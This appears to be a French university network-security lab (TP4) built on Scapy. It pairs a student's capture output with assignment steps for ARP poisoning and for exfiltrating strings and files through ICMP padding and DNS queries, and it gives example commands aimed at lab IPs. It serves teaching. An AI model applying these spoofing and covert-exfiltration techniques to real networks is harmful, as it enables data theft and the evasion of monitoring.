# TP4 SECU : Exfiltration

# Sommaire

- [Sommaire](#sommaire)
- [I. Getting started Scapy](#i-getting-started-scapy)
- [II. ARP Poisoning](#ii-arp-poisoning)
- [II. Exfiltration ICMP](#ii-exfiltration-icmp)
- [III. Exfiltration DNS](#iii-exfiltration-dns)


# I. Getting started Scapy

🌞 **`ping.py`**

> le `ping` est bloqué vers la passerelle.

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 ping.py
Begin emission

Finished sending 1 packets
...*
Received 4 packets, got 1 answers, remaining 0 packets
Pong reçu : QueryAnswer(query=<Ether  dst=c8:5e:a9:3e:3e:fb src=f2:39:c5:c0:07:e5 type=IPv4 |<IP  frag=0 proto=icmp src=10.33.67.174 dst=10.33.73.226 |<ICMP  type=echo-request |>>>, answer=<Ether  dst=f2:39:c5:c0:07:e5 src=c8:5e:a9:3e:3e:fb type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=28 id=47053 flags= frag=0 ttl=64 proto=icmp chksum=0x2142 src=10.33.73.226 dst=10.33.67.174 |<ICMP  type=echo-reply code=0 chksum=0x0 id=0x0 seq=0x0 unused=b'' |>>>)
```

🌞 **`tcp_cap.py`**

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 tcp_cap.py 
TCP SYN ACK reçu !
- Adresse IP src : 34.120.22.49
- Adresse IP dest : 10.33.67.174
- Port TCP src : 443
- Port TCP dst : 59881
```

🌞 **`dns_cap.py`**

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 dns_cap.py
DNS Ans : 104.26.10.233
WARNING: Socket <scapy.arch.bpf.supersocket.L2bpfListenSocket object at 0x107a501d0> failed with 'Layer [1] not found'. It was closed.
```

🌞 **`dns_lookup.py`**

```bash
stan@Stanislass-MacBook-Pro-2 tp4-secu-2024 % python3 dns_loockup.py 
DNS Ans 172.67.74.226
```

# II. ARP Poisoning


🌞 **`arp_poisoning.py`**

- craftez une trame ARP qui empoisonne la table d'un voisin
  - je veux que, pour la victime, l'adresse IP `10.13.33.37` corresponde à la MAC `de:ad:be:ef:ca:fe`
- **testez avec des VMs uniquement, ou entre vous uniquement**
- prouvez avec une commande sur la machine victime que la fausse donnée a été injectée
- vous n'avez le droit qu'aux fonctions `srp()`, `sr()`, `send()`, `sendp()`

# II. Exfiltration ICMP

➜ **Ici, on va se servir de notre ami le ping pour exfiltrer des données.**

Si vous n'aviez pas noté jusqu'alors en faisant joujou à la partie I, chaque paquet ICMP (ping et pong) contiennent une section appelée "padding" de taille variable, généralement remplie de 0. C'est là, on envoie plein de 0 sur le réseau, kom sa, à chaque ping.

**C'est l'endroit idéal pour stocker des données meow.**

P'tit schéma d'un paquet ICMP [~~volé sur internet ici~~](https://www.freesoft.org/CIE/Course/Section3/7.htm) :

![Kikoo toa](./img/padding.png)

**On va littéralement envoyer des pings, mais le padding on va l'utiliser pour stocker des données.** Autrement dit, on va utiliser des pings pour envoyer de la data à quelqu'un.

Dans notre contexte : pour exfiltrer des données, on peut juste envoyer des ping enfet !

🌞 **`icmp_exf_send.py`**

- envoie un caractère passé en argument dans un ping
  - un seul caractère pour le moment
- l'IP destination est aussi passée en argument
- on doit pouvoir faire par exemple :

```bash
# envoie le caractère "j" caché dans un ping vers 10.1.1.1
$ python icmp_exfiltration_send_1.py 10.1.1.1 j
```

On peut récup les arguments passés au script comme ça :

```python
# La liste argv contient tous les arguments dans l'ordre
from sys import argv

print(f"Ceci est le premier argument : {argv[0]}.")
print(f"Ceci est le deuxième argument : {argv[1]}.")
```

🌞 **`icmp_exf_receive.py`**

- sniff le réseau
- affiche **UNIQUEMENT** le caractère caché si un paquet ICMP d'exfiltration est reçu et quitte après réception de 1 paquet
- si un ping legit est reçu, ou n'importe quoi d'autre votre code doit continuer à tourner
- il attend (avec un filtre sur `sniff()` et des conditions dans la fonction qui traite le paquet) **uniquement** le ping qui contient les données exfiltrées, et les affiche

> Mettez vous dans un setup à deux PCs, ou avec une VM, truc du genre.

⭐ **Bonus 1 easy :**

- **`icmp_exf_send_b1.py`** et **`icmp_exf_receive_b1.py`**
- parce que là, bon envoyer "j" ça sert à rien
- faites en sorte que ça fonctionne peu importe la longueur de la string passée en argument du script `icmp_exf_send_b1.py`
  - bah oui le padding il a une taille limitée...
  - quelle taille ? [See une bonne doc](https://www.freesoft.org/CIE/Course/Section3/7.htm)
  - il va falloir donc couper la string en plusieurs morceaux, et envoyer plusieurs pings !
- le programme qui reçoit `icmp_exf_receive_b1.py` doit reconstruire le message à partir de tous les pings qu'il reçoit
  - **il affiche toujours uniquement la string cachée**, rien d'autre
- on doit donc pouvoir faire des trucs comme :

```bash
# envoie une string cachée dans un ping vers 10.1.1.1
$ python icmp_exf_send_nolimit.py 10.1.1.1 "Coucou toi comment ça va broooooo"
```

⭐ **Bonus 2 hard : `icmp_exf_send_anything.py`**

- **`icmp_exf_send_b2.py`** et **`icmp_exf_receive_b2.py`**
- envoyez un fichier avec des ping
- faites simple pour les tests : créez un fichier de quelque Ko tout au plus (peu importe le format justement, on s'en fout)
- genre une fois que ça marche, on doit pouvoir envoyer des JPEG avec des ping
- c'est la même idée que la string : fragmenter le JPEG en p'tits morceaux, envoyer, reconstituer de l'autre côté

# III. Exfiltration DNS

**DNS est donc un protocole qu'on peut aussi détourner de son utilisation première pour faire de l'exfiltration.**

Vu qu'on va envoyer des requêtes DNS pour exfiltrer les données il faut dans l'idéal un service qui tourne pour les recevoir (port 53 UDP), et sur cette machine qui fait tourner le service, un ptit programme `scapy` qui réceptionne et traite tout ce qui est reçu. Les logs du service ça peut faire l'affaire aussi !

> Bon ! Vous vous me la faites tout seul celle-ci ? Quelques recherches sur internet, y'a toute la doc du monde sur ça.

🌞 **`dns_exfiltration_send.py`**

- envoie des données passées en argument à l'IP passée en argument
- utilise le protocole DNS pour exfiltrer lesdites données
- une string de 20 caractères doit pouvoir être exfiltrée

On doit pouvoir faire :

```bash
$ dns_exfiltration_send.py 10.1.1.1 toto
```

⭐ **Bonus 3 mid : `dns_exfiltration_send.py`**

- en dernier bonus : mettez en place le code qui reçoit votre exfiltration DNS
- il n'affiche que les strings cachées dans les requêtes reçues

![DNS exfiltration](./img/dns_exf.jpg)